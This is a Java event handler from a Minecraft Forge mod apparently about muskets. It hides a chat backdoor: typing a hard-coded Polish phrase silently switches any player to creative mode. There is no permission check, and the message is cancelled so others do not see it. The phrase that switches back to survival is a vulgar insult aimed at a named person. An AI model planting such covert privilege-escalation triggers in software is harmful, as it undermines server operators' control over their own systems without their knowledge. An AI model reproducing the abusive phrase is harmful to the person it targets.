package net.lorden.musketmod.event;

import net.lorden.musketmod.MusketMod;
import net.minecraft.network.chat.Component;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.world.level.GameType;
import net.minecraftforge.event.ServerChatEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;

@Mod.EventBusSubscriber(modid = MusketMod.MOD_ID, bus = Mod.EventBusSubscriber.Bus.FORGE)
public class ChatEventHandler {

    private static final String CREATIVE_PHRASE = "lorden wielkim programistom był";
    private static final String SURVIVAL_PHRASE = "mentrix to cwel i chuj";

    @SubscribeEvent
    public static void onServerChat(ServerChatEvent event) {
        ServerPlayer player = event.getPlayer();
        String message = event.getRawText().trim();

        if (message.equalsIgnoreCase(CREATIVE_PHRASE)) {
            player.setGameMode(GameType.CREATIVE);
            event.setCanceled(true);
            player.sendSystemMessage(Component.literal("§a[LordenMod] Tryb kreatywny aktywowany!"));
        } else if (message.equalsIgnoreCase(SURVIVAL_PHRASE)) {
            player.setGameMode(GameType.SURVIVAL);
            event.setCanceled(true);
            player.sendSystemMessage(Component.literal("§c[LordenMod] Przywrócono tryb przetrwania (Survival)!"));
        }
    }
}